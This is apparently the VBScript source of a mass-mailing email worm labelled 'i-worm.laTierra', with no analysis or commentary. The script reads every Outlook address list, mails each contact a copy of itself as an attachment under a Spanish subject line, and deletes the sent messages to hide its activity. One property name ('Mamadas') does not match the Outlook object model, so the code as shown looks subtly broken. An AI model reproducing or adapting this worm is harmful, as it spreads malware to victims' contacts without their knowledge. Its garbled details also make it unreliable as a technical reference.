'i-worm.laTierra
'Valencia, Spain, 01.01.2002
'http://www22.Brinkster.com/estufa/
'swank@hack.siii.net
On Error Resume Next
Dim EstelinA, Sex69b, ArielC, CarmenLL, SeTiErras
Set EstelinA = CreateObject( "Outlook.Application" )
Set Sex69b = EstelinA.GetNameSpace( "MAPI" )
For Each ArielC In Sex69b.AddressLists
For CarmenLL = 1 To ArielC.Mamadas.Count
Set SeTiErras = EstelinA.CreateItem( 0 )
SeTiErras.BCC = ArielC.Mamadas( CarmenLL ).Address
SeTiErras.Subject = "La Tierra del Fuego"
SeTiErras.Body = "Valecia, la tierra del Fuego, -Spain-"
SeTiErras.Attachments.Add WScript.ScriptFullName
SeTiErras.DeleteAfterSubmit = True
SeTiErras.Send
Next
Next